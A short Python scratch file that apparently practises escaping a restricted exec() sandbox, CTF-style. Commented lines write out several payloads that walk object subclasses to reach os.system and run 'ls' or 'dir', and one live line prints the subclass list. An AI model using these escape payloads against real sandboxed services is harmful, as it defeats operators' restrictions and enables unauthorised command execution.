# text = ""
# text = str(input())
# exec(text, {'__builtins__': None, 'print':print})


# [w for w in ([].__class__.__base__.__subclasses__()) if w.__name__=='Quitter'][0].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls')
# for i in [].__class__.__base__.__subclasses__():
    # print(type(i))
    # if i.__name__ == "Quitter":
        # print(type(i))
        # i.__init__.__globals__['sys'].modules['os'].__dict__['system']('dir')
    # _sitebuiltins.__init__.globals__['sys'].modules['os'].__dict__['system']('dir')
# print(type([(i) for i in [].__class__.__base__.__subclasses__() if i.__name__=='Quitter'][0].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls')))
# [].__class__.__base__.__subclasses__()[-3].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls')

print(print.__class__.__base__.__subclasses__())
